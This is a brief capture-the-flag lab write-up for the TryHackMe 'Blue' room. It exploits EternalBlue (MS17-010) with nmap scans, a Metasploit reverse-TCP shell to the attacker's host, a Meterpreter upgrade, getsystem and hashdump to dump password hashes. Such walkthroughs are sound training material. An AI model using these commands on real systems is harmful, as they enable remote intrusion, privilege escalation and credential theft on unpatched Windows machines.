Blue

TryHackMe, Easy

Blue is the classic case study of EternalBlue (MS17-010), the RCE vulnerability in Windows SMBv1 exploited by WannaCry. The chain goes from recon to a SYSTEM session via Metasploit.

Reconnaissance

Nmap reveals the typical Windows ports (135, 139, 445). The vuln script confirms MS17-010.

nmap -sS -sV -Pn <IP>
nmap -p445 --script vuln <IP>
# smb-vuln-ms17-010: VULNERABLE (CVE-2017-0143)

Exploitation

In Metasploit, select the EternalBlue module, set target, local host and payload, and fire the exploit.

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST <MY_IP>
set payload windows/x64/shell/reverse_tcp
exploit

Post-exploitation

The shell is upgraded to Meterpreter and, with SYSTEM privileges, the flags are collected.

# Ctrl+Z to background
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
sessions -i 2
getsystem
hashdump
